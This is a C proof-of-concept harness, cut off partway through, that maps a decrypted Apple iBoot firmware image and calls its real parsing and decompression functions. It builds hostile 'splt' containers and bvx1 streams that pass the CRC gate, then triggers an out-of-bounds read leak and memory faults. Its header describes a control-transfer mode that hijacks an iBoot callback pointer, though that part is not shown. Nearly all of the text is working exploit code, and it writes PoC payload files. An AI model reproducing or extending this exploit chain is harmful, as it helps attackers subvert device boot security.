// chain.c — Part A (pre-auth 'splt' pipeline demo) + Part B support probes
// iBoot mBoot-18000.162.8 t8140, iboot_dec.bin (addr == file off, VA = off + 0x1FC080000)
//
// Modes:
//   gate   - REAL FUN_0014B4B8 ('splt' gate) positive/negative matrix + host CRC mirror check
//   parse  - minimal-drive REAL FUN_0014C3B0 (HRSS container member parse): acceptance differential
//   chain  - REAL gate -> loader-faithful chunk loop -> REAL dispatcher id=0x8A1/0x891
//            hostile bvx1 chunks: benign control / OOB-read leak / hard fault inside pipeline
//   full   - attempt REAL FUN_0014B580 end-to-end on RWX copy rebased at preferred base
//            (documents exactly which boot subsystem stops the emulation)
//   rce    - CONTROL-TRANSFER DEMO: real gate -> loader-faithful chunk walk -> real
//            dispatcher id=0x205 stored-block linear overwrite smashes the REAL iBoot
//            callback slot _DAT_003F6638 (the sysconfig assert-hook consumed by the
//            FUN_001e2eb0 getter / FUN_001e5080 validator pair); then REAL FUN_001e5080
//            is invoked so genuine iBoot code does `bl FUN_001e2eb0; blraaz x8` through
//            the attacker-written pointer into an emitted arm64 canary page.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <signal.h>
#include <setjmp.h>

typedef uint8_t  u8; typedef uint16_t u16; typedef uint32_t u32; typedef uint64_t u64;
typedef int32_t  s32;

#define GUARD    (512*1024)
#define APRON    (64*1024)
#define FW_PATH  "/tmp/ds_iboot/iboot_dec.bin"
#define SCRATCH_SZ (192*1024)
#define PREFERRED_BASE 0x1FC080000ULL

/* v162.10 port: DS_FW env selects the binary; a "23g83" path applies the
 * relocated offsets (gate +0x1C0, loader +0x1BC, dispatcher/tables +0x80). */
static const char *g_fw_path = FW_PATH;
static uintptr_t OFF_GATE = 0x14B4B8, OFF_LOADER = 0x14B580, OFF_DISP = 0x1EB3C8;
static uintptr_t TB_OFF[6] = {0x331340,0x331354,0x3313A4,0x3313B8,0x331408,0x331448};

static u8  *g_fw; static size_t g_fw_sz;
static int  g_rebased;                       // 1 if mapped at preferred base

typedef long (*fn_gate)(void *hdr, void *lo, void *hi, void *x3, u32 blobsize);
typedef long (*fn_disp)(void *dst, size_t dstcap, const void *src, size_t srclen, void *scr, u32 id);
typedef long (*fn_loader)(void *ctx, void *lo, void *hi, void *x3);
static fn_gate   g_gate;
static fn_disp   g_disp;
static fn_loader g_loader;

/* ---------- fault-guarded execution ---------- */
static sigjmp_buf g_jb; static volatile int g_armed;
struct F { int signo; u64 pc, addr; u64 r[6]; } g_F;
struct R { long ret; int faulted; struct F f; };

static void alrm_handler(int sig, siginfo_t *si, void *uc) {
  (void)si;
  ucontext_t *u = (ucontext_t*)uc;
  if (!g_armed) _exit(67);
  g_F.signo = sig; g_F.pc = u->uc_mcontext->__ss.__pc; g_F.addr = 0xDEAD0000ULL;
  g_armed = 0;
  siglongjmp(g_jb, 1);
}

static void handler(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  if (!g_armed) {
    fprintf(stderr, "!! UNGUARDED fatal sig=%d addr=%p pc=%llx\n", sig, si->si_addr,
            (unsigned long long)(u->uc_mcontext->__ss.__pc - (u64)g_fw));
    _exit(66);
  }
  g_F.signo = sig; g_F.pc = u->uc_mcontext->__ss.__pc; g_F.addr = (u64)si->si_addr;
  g_F.r[0]=u->uc_mcontext->__ss.__x[0]; g_F.r[1]=u->uc_mcontext->__ss.__x[1];
  g_F.r[2]=u->uc_mcontext->__ss.__x[2]; g_F.r[3]=u->uc_mcontext->__ss.__x[3];
  g_F.r[4]=u->uc_mcontext->__ss.__lr;
  g_armed = 0;
  siglongjmp(g_jb, 1);
}
#define GUARDED(expr, outR) do { \
  g_armed = 1; alarm(6); \
  if (sigsetjmp(g_jb, 1) == 0) { (outR).ret = (expr); (outR).faulted = 0; g_armed = 0; alarm(0); } \
  else { (outR).ret = -9999; (outR).faulted = 1; (outR).f = g_F; alarm(0); } \
} while (0)

/* ---------- guarded buffers with marker aprons ---------- */
struct buf {
  u8 *payload; size_t cap;
  u8 *lo; u8 *hi; size_t lo_sz, hi_sz;
  u8 *raw; size_t total;
};
static void mkbuf(struct buf *b, size_t cap) {
  size_t total = GUARD + APRON + cap + APRON + GUARD;
  u8 *m = mmap(NULL, total, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (m == MAP_FAILED) { perror("mmap"); exit(1); }
  mprotect(m, GUARD, PROT_NONE);
  mprotect(m + GUARD + APRON + cap + APRON, GUARD, PROT_NONE);
  memset(m + GUARD, 0xA5, APRON);
  memset(m + GUARD + APRON + cap, 0x5A, APRON);
  b->raw = m; b->total = total;
  b->lo = m + GUARD; b->lo_sz = APRON;
  b->hi = m + GUARD + APRON + cap; b->hi_sz = APRON;
  b->payload = m + GUARD + APRON; b->cap = cap;
}
static void rmbuf(struct buf *b) { munmap(b->raw, b->total); }

static u32 rd32(const u8 *p) { u32 v; memcpy(&v, p, 4); return v; }
static void wr32(u8 *p, u32 v) { memcpy(p, &v, 4); }
static void wr16(u8 *p, u16 v) { memcpy(p, &v, 2); }

/* ---------- firmware mapping ----------
 * macOS W^X forbids anon RWX and hint-only mmaps land anywhere, so:
 * reserve one PROT_NONE span, then MAP_FIXED sub-maps inside it:
 *   [t,        t+0x204000)   file R|X   code (max func start 0x201AAC)
 *   [t+0x204000, file_end)   file R|W   COW data (CRC table @0x3efc14, lock/staging globals)
 *   [roundup(file_end), +16M) anon  R|W  .bss extension (lock-stack array VA 0x1fc471058) */
#define TEXT_SPLIT 0x204000UL
static void fw_map(int rebase) {
  if (getenv("DS_FW")) g_fw_path = getenv("DS_FW");
  if (strstr(g_fw_path, "23g83")) {
    OFF_GATE += 0x1C0; OFF_LOADER += 0x1BC; OFF_DISP += 0x80;
    for (int i = 0; i < 6; i++) TB_OFF[i] += 0x80;
  }
  int fd = open(g_fw_path, O_RDONLY);
  if (fd < 0) { perror("open fw"); exit(1); }
  struct stat st; fstat(fd, &st); g_fw_sz = st.st_size;
  size_t rounded = (g_fw_sz + 0x3FFF) & ~0x3FFFul;
  size_t span = TEXT_SPLIT + ((rounded - TEXT_SPLIT + 0x3FFF) & ~0x3FFFul) + (16<<20);
  uintptr_t base = rebase ? PREFERRED_BASE : 0;
  u8 *rsv = mmap((void*)(uintptr_t)base, span, PROT_NONE,
                 MAP_ANON|MAP_PRIVATE | (rebase ? MAP_FIXED : 0), -1, 0);
  if (rsv == MAP_FAILED) { perror("mmap rsv"); exit(1); }
  if (mmap(rsv, TEXT_SPLIT, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, 0) != rsv)
    { perror("mmap text"); exit(1); }
  size_t datsz = rounded - TEXT_SPLIT;
  if (mmap(rsv + TEXT_SPLIT, datsz, PROT_READ|PROT_WRITE,
           MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, TEXT_SPLIT) != rsv + TEXT_SPLIT)
    { perror("mmap data"); exit(1); }
  // .bss extension (everything past file end incl. CRC-table @0x3efc10, heap slack)
  if (mmap(rsv + rounded, span - (rounded), PROT_READ|PROT_WRITE,
           MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) != rsv + rounded)
    { perror("mmap bss"); exit(1); }
  g_fw = rsv; g_rebased = rebase;
  close(fd);
}

static void bind_fns(void) {
  g_gate   = (fn_gate)(g_fw + OFF_GATE);
  g_loader = (fn_loader)(g_fw + OFF_LOADER);
  g_disp   = (fn_disp)(g_fw + OFF_DISP);
}

/* ===================== synthetic bvx1 builder (from proven qsweep.c) ===== */
static const u32 *TB_LR_BASE, *TB_ML_BASE, *TB_D_BASE;
static const u8   *TB_LR_XTRA, *TB_ML_XTRA, *TB_D_XTRA;
static void tb_init(void) {
  TB_LR_XTRA = g_fw + TB_OFF[0];
  TB_LR_BASE = (const u32*)(g_fw + TB_OFF[1]);
  TB_ML_XTRA = g_fw + TB_OFF[2];
  TB_ML_BASE = (const u32*)(g_fw + TB_OFF[3]);
  TB_D_XTRA  = g_fw + TB_OFF[4];
  TB_D_BASE  = (const u32*)(g_fw + TB_OFF[5]);
}
static int dist_encode(u32 D, int *sym_out, u32 *extra_out, int *W_out) {
  for (int s = 63; s >= 0; s--) {
    u32 b = TB_D_BASE[s]; int w = TB_D_XTRA[s];
    if (D >= b && (w == 64 || (D - b) < (1u << w))) { *sym_out = s; *extra_out = D - b; *W_out = w; return 0; }
  }
  return -1;
}
#define BHDR_SZ 0x304
/* T matches, L literals ('A'), M match bytes, D[k] distances (one symbol). */
static long build_bvx1(u8 *out, size_t cap, int T, int L, int M, const u32 *D) {
  if (cap < BHDR_SZ + 64 + T * 32 + 64) return -1;
  memset(out, 0, BHDR_SZ + 64 + T * 32 + 64);
  wr32(out + 0x00, 0x31787662);            // 'bvx1'
  wr32(out + 0x04, (u32)(T * (L + M)));
  u16 *l_freq = (u16*)(out + 0x32), *m_freq = (u16*)(out + 0x5A);
  u16 *d_freq = (u16*)(out + 0x82), *b_freq = (u16*)(out + 0x102);
  int dsym = -1, Wsum = 0;
  int Ws[256]; u32 exs[256];
  if (T > 256) return -5;
  for (int k = 0; k < T; k++) {
    int s, W; u32 ex;
    if (dist_encode(D[k], &s, &ex, &W)) return -2;
    if (dsym < 0) dsym = s; else if (s != dsym) return -4;
    Ws[k] = W; exs[k] = ex; Wsum += W;
  }
  int Lsym = -1, Msym = -1;
  for (int s = 0; s < 20; s++) { if (!TB_LR_XTRA[s] && (int)TB_LR_BASE[s] == L) Lsym = s;
                                 if (!TB_ML_XTRA[s] && (int)TB_ML_BASE[s] == M) Msym = s; }
  if (Lsym < 0 || Msym < 0) return -3;
  l_freq[Lsym] = 64; m_freq[Msym] = 64; d_freq[dsym] = 256;
  b_freq[0x41] = 1024;
  int tpad = 7;
  size_t Cbits = (size_t)Wsum;
  size_t J = (size_t)tpad + Cbits;
  size_t core = (J + 7) / 8; if (core == 0) core = 1;
  size_t Blmd = core < 32 ? 32 : core;
  wr32(out + 0x08, (u32)Blmd);
  wr32(out + 0x0C, (u32)(T * L));
  wr32(out + 0x10, (u32)T);
  wr32(out + 0x14, 0);
  wr32(out + 0x18, (u32)Blmd);
  wr32(out + 0x1C, 0);
  wr32(out + 0x28, -(s32)tpad);
  wr16(out + 0x2A, 0xFFFF);
  wr16(out + 0x20, 17); wr16(out + 0x22, 18); wr16(out + 0x24, 19); wr16(out + 0x26, 20);
  wr16(out + 0x2C, 5); wr16(out + 0x2E, 7); wr16(out + 0x30, 13);
  memset(out + BHDR_SZ, 0, Blmd);
  size_t j = tpad;
  for (int k = 0; k < T; k++)
    for (int b = 0; b < Ws[k]; b++, j++)
      if ((exs[k] >> (Ws[k]-1-b)) & 1) {
        size_t bytei = Blmd - 1 - j / 8;
        out[BHDR_SZ + bytei] |= (u8)(1u << (7 - j % 8));
      }
  return (long)(BHDR_SZ + Blmd);
}

/* ===================== host CRC-32 mirror of FUN_001592F4 ================
 * FUN_00159428 @0x159434: init w0=0xFFFFFFFF; FUN_0015925C: reflected table
 * poly 0xEDB88320 built at .bss 0x3efc14, per-byte crc=tab[(c^b)&ff]^(c>>8);
 * wrapper returns ~crc => standard zlib crc32 over [start,end). */
static u32 host_crc32(const u8 *p, size_t n) {
  static u32 tab[256]; static int have;
  if (!have) {
    for (u32 i = 0; i < 256; i++) {
      u32 c = i;
      for (int k = 0; k < 8; k++) c = (c & 1) ? 0xEDB88320u ^ (c >> 1) : c >> 1;
      tab[i] = c;
    }
    have = 1;
  }
  u32 c = 0xFFFFFFFFu;
  for (size_t i = 0; i < n; i++) c = tab[(c ^ p[i]) & 0xFF] ^ (c >> 8);
  return ~c;
}

/* ===================== 'splt' container builder ==========================
 * Header layout pinned from FUN_0014B4B8 disasm @0x14B4E4..0x14B538:
 *   +0x00 'splt'   +0x04 crc32   +0x08/+0x0C free (CRC'd)
 *   +0x10 flag(!=0, CRC'd)       +0x14 cnt (CRC'd)
 *   +0x18 cnt x u32 declared chunk lengths (CRC'd)   data at +0x18+cnt*4
 * CRC covers [hdr+8, hdr+0x18+cnt*4) len = cnt*4+0x10.
 * blob_size (== ctx+0x48 word) must be > cnt*4+0x18 (gate @0x14B50C).
 */
struct splt_spec {
  u32 field_a, field_b;     // +0x08/+0x0C (free, CRC'd)
  u32 flag;                 // +0x10 must be != 0
  const u32 *declens; int cnt;
  const u8 *data; size_t datalen;
};
static long build_splt(u8 *out, size_t cap, const struct splt_spec *sp, int break_crc) {
  size_t need = 0x18 + (size_t)sp->cnt * 4 + sp->datalen;
  if (cap < need) return -1;
  memset(out, 0, need);
  memcpy(out, "splt", 4);
  wr32(out + 0x08, sp->field_a);
  wr32(out + 0x0C, sp->field_b);
  wr32(out + 0x10, sp->flag);
  wr32(out + 0x14, (u32)sp->cnt);
  for (int i = 0; i < sp->cnt; i++) wr32(out + 0x18 + 4*i, sp->declens[i]);
  u32 crc = host_crc32(out + 8, (size_t)sp->cnt * 4 + 0x10);
  if (break_crc) crc ^= 1;
  wr32(out + 0x04, crc);
  memcpy(out + 0x18 + (size_t)sp->cnt * 4, sp->data, sp->datalen);
  return (long)need;
}

/* loader ctx we construct (only fields the real loader consumes):
 *  [0]=hdr [1]=range lo [2]=range hi ; +0x48 w27 chunk-cap/blob-size ; +0x54 ALGO */
struct lctx { u64 w[16]; };
static void mk_ctx(struct lctx *c, u8 *hdr, size_t blob, u32 algo) {
  memset(c, 0, sizeof(*c));
  c->w[0] = (u64)hdr;
  c->w[1] = (u64)hdr - 0x100000;      // range lo
  c->w[2] = (u64)hdr + 0x100000;      // range hi
  *(u32*)((u8*)c + 0x48) = (u32)blob;
  *(u32*)((u8*)c + 0x54) = algo;
}

static void hexdump(const char *tag, const u8 *p, size_t n) {
  printf("%s (%zu bytes):\n", tag, n);
  for (size_t i = 0; i < n; i += 16) {
    printf("  %04zx:", i);
    for (size_t j = 0; j < 16 && i+j < n; j++) printf(" %02x", p[i+j]);
    printf("\n");
  }
}

/* hostile stream builder: warm block (pads produced to 32) + hostile-D block.
 * Same recipe proven in qsweep q1/B and leak modes. */
static long build_stream(u8 *strm, size_t cap, u32 Dh) {
  u32 Dw[4] = {4,5,4,5};   /* qsweep-proven order: every match stays in-window */
  u32 Dh_[4] = {Dh,Dh,Dh,Dh};
  long b1 = build_bvx1(strm, cap, 4, 4, 4, Dw);
  if (b1 < 0) return b1;
  long b2 = build_bvx1(strm + b1, cap - b1, 4, 15, 8, Dh_);
  if (b2 < 0) return b2;
  wr32(strm + b1 + b2, 0x24787662);          // 'bvx$' terminator
  return b1 + b2 + 4;
}

/* count deviations from fill byte inside apron */
static int foreign_lo(struct buf *d) {
  size_t n = d->lo_sz >= 16 ? d->lo_sz - 16 : d->lo_sz; /* last 16B hold our canary */
  for (size_t i = 0; i < n; i++) if (d->lo[i] != 0xA5) return 1;
  return 0;
}
static int foreign_hi(struct buf *d) {
  for (size_t i = 0; i < d->hi_sz; i++) if (d->hi[i] != 0x5A) return 1;
  return 0;
}

static void poke32(void *addr, u32 w) {
  uintptr_t pg = (uintptr_t)addr & ~0xFFFul;
  mprotect((void*)pg, 0x2000, PROT_READ|PROT_WRITE);
  *(volatile u32*)addr = w;
  __builtin___clear_cache((char*)addr, (char*)addr + 4);
  mprotect((void*)pg, 0x2000, PROT_READ|PROT_EXEC);
}

/* ======================================================================== */
int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "gate";
  int rebase = (argc > 2 && !strcmp(argv[2], "rebase"));
  setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);
  struct sigaction sa; memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = handler; sa.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL); sigaction(SIGILL, &sa, NULL);
  sigaction(SIGTRAP, &sa, NULL); sigaction(SIGABRT, &sa, NULL);
  sigaction(SIGSYS, &sa, NULL); sigaction(SIGFPE, &sa, NULL);
  sa.sa_sigaction = alrm_handler; sigaction(SIGALRM, &sa, NULL);

  fw_map(rebase);
  bind_fns();
  tb_init();

  // touch-probe whole mapped file to catch dead pages early (guarded)
  {
    struct R rp;
    GUARDED(({ for (size_t off = 0; off < g_fw_sz; off += 0x10000)
                *(volatile u8*)((u8*)g_fw + off);
              *(volatile u8*)((u8*)g_fw + g_fw_sz - 1); }), rp);
    printf("[probe] full-file touch: faulted=%d sig=%d addr=%llx\n",
           rp.faulted, rp.faulted?rp.f.signo:0,
           rp.faulted ? (unsigned long long)(rp.f.addr - (u64)g_fw) : 0ull);
  }

  printf("[fw] %s mapped at %p size=%zu rebase=%d\n", g_fw_path, (void*)g_fw, g_fw_sz, g_rebased);

  /* =================== MODE gate ====================================== */
  if (!strcmp(mode, "gate")) {
    printf("== REAL FUN_0014B4B8 'splt' gate matrix ==\n");
    u8 strm[8192];
    long slen = build_stream(strm, sizeof(strm), 23 /* benign-ish D */);
    printf("[build_stream] slen=%ld\n", slen);

    u32 dl[1]; struct splt_spec sp = {0x11111111, 0x22222222, 1, dl, 1, strm, (size_t)slen};
    u8 cont[16384];
    long clen = build_splt(cont, sizeof(cont), &sp, 0);
    dl[0] = (u32)slen;
    clen = build_splt(cont, sizeof(cont), &sp, 0);
    printf("[container] len=%ld magic=%08x crc=%08x flag=%u cnt=%u declen0=%u\n",
           clen, rd32(cont), rd32(cont+4), rd32(cont+0x10), rd32(cont+0x14), rd32(cont+0x18));
    hexdump("container head 0x20", cont, 0x20);

    struct R r;
    // G-pos: valid container -> must return 1
    GUARDED(g_gate(cont, cont-0x1000, cont+0x10000, 0, (u32)clen), r);
    printf("G-pos  valid            : ret=%ld faulted=%d -> %s\n", r.ret, r.faulted,
           (!r.faulted && r.ret==1) ? "ACCEPT(real gate)" : "**FAIL**");

    // G-magic: wrong magic -> clean false
    cont[0]='x';
    GUARDED(g_gate(cont, cont-0x1000, cont+0x10000, 0, (u32)clen), r);
    printf("G-mag  magic='xspl'     : ret=%ld faulted=%d -> %s\n", r.ret, r.faulted,
           (!r.faulted && r.ret==0) ? "CLEAN-FALSE" : "**FAIL**");
    cont[0]='s';

    // G-crc: corrupted CRC -> real fatal path must fire
    ((u32*)cont)[1] ^= 1;
    GUARDED(g_gate(cont, cont-0x1000, cont+0x10000, 0, (u32)clen), r);
    if (r.faulted)
      printf("G-crc  bad CRC          : faulted=1 sig=%d%s pc_off=%llu -> ABORT-PATH-FIRED\n",
             r.f.signo, r.f.signo == 14 ? "(watchdog=spin)" : "",
             r.f.signo == 14 ? 0ull : (unsigned long long)(r.f.pc-(u64)g_fw));
    else
      printf("G-crc  bad CRC          : ret=%ld -> **FAIL**(accepted bad CRC!)\n", r.ret);
    ((u32*)cont)[1] ^= 1;

    // G-size: blob_size == cnt*4+0x18 exactly -> abort
    GUARDED(g_gate(cont, cont-0x1000, cont+0x10000, 0, 1*4+0x18), r);
    printf("G-size blob=cnt*4+0x18  : faulted=%d sig=%d -> %s\n", r.faulted, r.faulted?r.f.signo:0,
           r.faulted ? "ABORT-PATH-FIRED" : "**FAIL**");

    // G-flag: hdr[+0x10]=0 -> abort
    wr32(cont+0x10, 0);
    GUARDED(g_gate(cont, cont-0x1000, cont+0x10000, 0, (u32)clen), r);
    printf("G-flag flag=0           : faulted=%d sig=%d -> %s\n", r.faulted, r.faulted?r.f.signo:0,
           r.faulted ? "ABORT-PATH-FIRED" : "**FAIL**");
    wr32(cont+0x10, 1);

    // G-range: hdr outside [lo,hi) -> abort
    GUARDED(g_gate(cont, cont+0x8, cont+0x10000, 0, (u32)clen), r);
    printf("G-rng  hdr outside range: faulted=%d sig=%d -> %s\n", r.faulted, r.faulted?r.f.signo:0,
           r.faulted ? "ABORT-PATH-FIRED" : "**FAIL**");
    return 0;
  }

  /* =================== MODE parse: minimal drive of REAL FUN_0014C3B0 ==
   * ABI pinned from prologue disasm @0x14C3CC..0x14C46C:
   *   x0=ctx(x1,x2 bounds)  x3=p4  x4=sret(32B zeroed,x5,x6 bounds)
   *   stack args: A,Alo,Ahi B,Blo,Bhi C,Clo,Chi D,Dlo,Dhi E,Elo,Ehi
   *   A..E are checked out-pointers (A u64 <-0, B..E u32 <-0/'HRSS').
   * ctx: +0x20 blob base, +0x28 &cursor(u32), +0x50 limit(u32).
   * Differential: bad framing -> clean ret 0 (no signal);
   *               good HRSS framing -> proceeds into allocator subsystem
   *               (expected fault there = acceptance witness).              */
  if (!strcmp(mode, "parse")) {
    printf("== minimal-drive REAL FUN_0014C3B0 (HRSS member parse) ==\n");

    u8 blob[4096]; memset(blob, 0, sizeof(blob));
    u32 cursor = 0;
    u32 id = 0x1234; u16 mlen = 0x40;
    memcpy(blob, "HRSS", 4); memcpy(blob+4, &id, 4); memcpy(blob+8, &mlen, 2);
    for (int i = 0; i < mlen; i++) blob[12+i] = (u8)('A'+i%26);
    u64 ctx[16]; memset(ctx, 0, sizeof(ctx));
    ctx[0x20/8] = (u64)blob; ctx[0x28/8] = (u64)&cursor;
    *(u32*)((u8*)ctx + 0x50) = sizeof(blob);

    static u8 scratch[0x400];
    u64 st[23]; int k = 0;
    #define SP3(ptr) st[k++]=(u64)(ptr), st[k++]=(u64)scratch, st[k++]=(u64)(scratch+sizeof(scratch))
    u64 A=0,B=0,C=0,D_=0,E=0;
    SP3(&A); SP3(&B); SP3(&C); SP3(&D_); SP3(&E);
    while (k < 23) st[k++] = 0;

    typedef long (*fn_p)(void*,void*,void*,void*,void*,void*,void*,void*,
                         u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64,u64);
    fn_p fp = (fn_p)(g_fw + 0x14C3B0);
    struct R r;

    GUARDED(fp(ctx, ctx, (u8*)ctx+0x100, 0, scratch, scratch, scratch+sizeof(scratch), 0,
               st[0],st[1],st[2],st[3],st[4],st[5],st[6],st[7],st[8],st[9],st[10],st[11],
               st[12],st[13],st[14]), r);
    if (!r.faulted)
      printf("HRSS-good: CLEAN ret=%ld cursor=%u\n", r.ret, cursor);
    else
      printf("HRSS-good: sig=%d pc_off=%llx x0=%llx x1(line?)=%lld lr_off=%llx\n",
             r.f.signo, (unsigned long long)(r.f.pc-(u64)g_fw),
             (unsigned long long)r.f.r[0], (long long)r.f.r[1],
             (unsigned long long)(r.f.r[4]-(u64)g_fw));

    memcpy(blob, "XRSX", 4); cursor = 0; A=B=C=D_=E=0;
    GUARDED(fp(ctx, ctx, (u8*)ctx+0x100, 0, scratch, scratch, scratch+sizeof(scratch), 0,
               st[0],st[1],st[2],st[3],st[4],st[5],st[6],st[7],st[8],st[9],st[10],st[11],
               st[12],st[13],st[14]), r);
    if (!r.faulted)
      printf("HRSS-bad : CLEAN ret=%ld (magic rejected cleanly)\n", r.ret);
    else
      printf("HRSS-bad : sig=%d pc_off=%llx line=x1=%lld lr=off+%llx\n",
             r.f.signo, (unsigned long long)(r.f.pc-(u64)g_fw),
             (long long)r.f.r[1], (unsigned long long)(r.f.r[4]-(u64)g_fw));

    return 0;
  }

  /* =================== MODE chain: THE PIPELINE DEMO =================== */
  if (!strcmp(mode, "chain")) {
    printf("== PIPELINE: real gate -> loader-faithful chunk loop -> real dispatcher ==\n");
    struct { const char *tag; u32 D; u32 algo; } cells[] = {
      { "benign control D=23 ", 23,     0x8A1 },
      { "leak D=56           ", 56,     0x8A1 },
      { "leak D=56           ", 56,     0x891 },
      { "fault D=262139      ", 262139, 0x8A1 },
    };
    for (unsigned ci = 0; ci < sizeof(cells)/sizeof(cells[0]); ci++) {
      u32 D = cells[ci].D, algo = cells[ci].algo;
      u8 strm[8192];
      long slen = build_stream(strm, sizeof(strm), D);
      if (slen < 0) { printf("cell %u build fail %ld\n", ci, slen); continue; }

      u32 dl[1] = { (u32)slen };
      struct splt_spec sp = { 0xAABBCCDD, 0xDEADBEEF, 1, dl, 1, strm, (size_t)slen };
      static u8 cont[16384];
      long clen = build_splt(cont, sizeof(cont), &sp, 0);

      { char p[256]; snprintf(p, sizeof(p), "/tmp/ds_iboot/poc_cell%u.bin", ci);
        FILE *f = fopen(p, "wb"); fwrite(cont, 1, clen, f); fclose(f); }

      // STEP 1: real gate on our container
      struct R rg;
      GUARDED(g_gate(cont, cont-0x100000, cont+0x1000000, 0, (u32)clen), rg);
      printf("[%s algo=%#x] container=%ldB gate: ret=%ld faulted=%d %s\n",
             cells[ci].tag, algo, clen, rg.ret, rg.faulted,
             (!rg.faulted && rg.ret==1) ? "PASS" : "**GATE-REJECTED**");
      if (rg.faulted || rg.ret != 1) continue;

      // STEP 2: loader-faithful chunk loop (transcribed from FUN_0014B580):
      //   x21(cursor)=hdr+0x18+cnt*4        @0x14B6F0/0x14B6FC
      //   per iter: disp(region.dst,region.cap,cursor,w27,scratch,w20) @0x14B748
      //   abort if ret==0 || ret&3          @0x14B74C
      //   cursor += table[i]                @0x14B7B8 ; table walk bound hdr+w27 @0x14B7B0
      struct lctx lc; mk_ctx(&lc, cont, (size_t)clen, algo);
      u32 w27 = *(u32*)((u8*)&lc + 0x48);
      u32 w20 = *(u32*)((u8*)&lc + 0x54);
      u64 cursor = (u64)(uintptr_t)(cont + 0x18 + 1*4);
      u64 tablep = (u64)(uintptr_t)(cont + 0x18);

      struct buf dst, scr;
      mkbuf(&dst, 4096); mkbuf(&scr, SCRATCH_SZ);
      memset(dst.payload, 0x11, dst.cap);
      // canary: 16 ASCII bytes ending exactly at dst_begin-1 (lower apron)
      memcpy(dst.payload - 16, "OOB-LEAK-CANARY!", 16);

      struct R rc; long produced_total = 0; int chunk = 0;
      GUARDED(g_disp(dst.payload, dst.cap, (void*)cursor, w27, scr.payload, w20), rc);
      chunk++;
      printf("  chunk loop iter1: ret=%ld faulted=%d", rc.ret, rc.faulted);
      if (rc.faulted) {
        printf(" sig=%d FAULT-pc=off+%llx addr=%llx delta_vs_dstbegin=%+lld",
               rc.f.signo, (unsigned long long)(rc.f.pc-(u64)g_fw), (unsigned long long)rc.f.addr,
               (long long)((long long)rc.f.addr - (long long)dst.payload));
        long d = (long)(rc.f.pc - (u64)g_fw);
        if (d >= 0x1EA100 && d < 0x1EA200) printf(" [inside match copier FUN_001EA100]");
      } else {
        produced_total += rc.ret;
        int a5 = 0, canary = 0; size_t firstcan = (size_t)-1;
        long scan = rc.ret > 0 ? (long)rc.ret : 4096;
        for (long i = 32; i < scan; i++) {
          if (dst.payload[i] == 0xA5) a5++;
          if (i+6 <= scan && !memcmp(dst.payload+i, "CANARY", 6)) { canary++; if (firstcan==(size_t)-1) firstcan=i; }
        }
        printf(" produced=%ld foreign_lo=%d foreign_hi=%d A5-in-output=%d CANARY-hits=%d",
               rc.ret, foreign_lo(&dst), foreign_hi(&dst), a5, canary);
        if (firstcan != (size_t)-1) printf(" LEAK-first@%lld", (long long)firstcan);
        // exact-window proof for D=56: first hostile match pulls dst[-9..-2]
        if (scan >= 55) {
          char win[9]; memcpy(win, dst.payload + 47, 8); win[8] = 0;
          printf(" out[47..54]='%s'", win);
        }
      }
      printf("\n");
      // loader post-decode receipts
      printf("  staging-model: produced_total=%ld tablewalk_next=%+lld (bound hdr+%u)\n",
             produced_total, (long long)((long long)tablep + 4 - (long long)cont), w27);
      if (!rc.faulted && rc.ret > 0) {
        printf("  out[0..47]: ");
        for (int i = 0; i < 48; i++) printf("%02x", dst.payload[i]);
        printf("\n");
        if (cells[ci].D <= 32) {
          u8 mdl[128]; size_t mo = 0;
          u32 DD[4] = {4,5,4,5};
          for (int kk = 0; kk < 4; kk++) {
            for (int i = 0; i < 4; i++) mdl[mo++] = 0x41;
            for (int i = 0; i < 4; i++) { mdl[mo] = mdl[mo-DD[kk]]; mo++; }
          }
          size_t warm = mo;                       // 32
          int ok1 = mo == 32 && !memcmp(dst.payload, mdl, 32) && !foreign_lo(&dst);
          int ok2 = 1;
          for (int kk = 0; kk < 4; kk++) {
            for (int i = 0; i < 15; i++) { if (dst.payload[mo] != 0x41) ok2 = 0; mo++; }
            for (int i = 0; i < 8; i++) { mdl[mo] = mdl[mo-cells[ci].D]; if (dst.payload[mo]!=mdl[mo]) ok2=0; mo++; }
          }
          printf("  model: warm32=%d full=%d (produced==%zu want==%zu)\n", ok1, ok2, (size_t)rc.ret, mo);
          (void)warm;
        }
      }
      rmbuf(&dst); rmbuf(&scr);
    }

    /* wild-cursor: cnt=2, table[1]=0xFFFFFFF0 -> loader cursor += ~4GiB,
     * second dispatcher call reads from hdr+0x18+len1+0xFFFFFFF0 (unmapped).
     * Proves declared-length words drive the SRC cursor (read direction). */
    {
      static u8 cont[16384];
      u8 strm2[4096];
      long slen2 = build_stream(strm2, sizeof(strm2), 23);
      u32 dl2[2] = { (u32)slen2, 0x01000000u };   /* +16MiB: past bss tail -> unmapped */
      struct splt_spec sp2 = { 1, 2, 1, dl2, 2, strm2, (size_t)slen2 };
      long clen2 = build_splt(cont, sizeof(cont), &sp2, 0);
      struct R rg;
      GUARDED(g_gate(cont, cont-0x100000, cont+0x1000000, 0, (u32)clen2), rg);
      printf("[wild-cursor cnt=2 declen1=0x01000000] gate ret=%ld faulted=%d\n", rg.ret, rg.faulted);
      if (!rg.faulted && rg.ret == 1) {
        struct lctx lc2; mk_ctx(&lc2, cont, (size_t)clen2, 0x8A1);
        u32 w27 = *(u32*)((u8*)&lc2 + 0x48);
        u64 cursor = (u64)(uintptr_t)(cont + 0x18 + 2*4);   /* start of chunk-0 data */
        struct buf dst2, scr2;
        mkbuf(&dst2, 4096); mkbuf(&scr2, SCRATCH_SZ);
        memset(dst2.payload, 0x11, dst2.cap);
        struct R rc;
        printf("  [dbg] cursor=%p w27=%u bytes:", (void*)cursor, w27);
